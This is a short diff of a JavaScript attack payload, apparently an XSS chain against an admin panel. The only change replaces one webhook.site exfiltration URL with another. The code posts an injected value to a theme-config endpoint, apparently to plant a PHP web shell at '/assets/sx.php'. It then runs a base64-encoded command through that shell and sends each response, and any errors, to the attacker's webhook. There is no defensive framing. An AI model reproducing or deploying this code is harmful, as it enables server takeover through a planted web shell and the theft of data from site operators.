@@ -1,5 +1,5 @@
 (async()=>{try{
-const U="https://webhook.site/3e8b4bf9-b2dc-4f7a-b666-6dd7e69c794a";
+const U="https://webhook.site/62ec098a-4792-4ae9-ad89-e624e6495539";
 const ex=(k,d)=>{const s=String(d);let n=0;for(let i=0;i<s.length;i+=20000){fetch(U+"/"+k+"_"+(n++),{method:"POST",body:s.substr(i,20000),mode:"no-cors"}).catch(()=>{})}};
 const post=async(u,b)=>{const r=await fetch(u,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:b});return r.text()};
 const get=async(u)=>{const r=await fetch(u);return r.text()};
@@ -13,4 +13,4 @@ ex("shellw",await post("/admin/api/plugin/setThemeConfig","id=Dream&a%27%3E%3Dco
 await get("/index/index/index");
 ex("shellt",await get("/assets/sx.php?c=c2lk"));
 ex("done","1");
-}catch(e){fetch("https://webhook.site/3e8b4bf9-b2dc-4f7a-b666-6dd7e69c794a/err",{method:"POST",body:String(e&&e.stack||e),mode:"no-cors"}).catch(()=>{})}})();
+}catch(e){fetch("https://webhook.site/62ec098a-4792-4ae9-ad89-e624e6495539/err",{method:"POST",body:String(e&&e.stack||e),mode:"no-cors"}).catch(()=>{})}})();
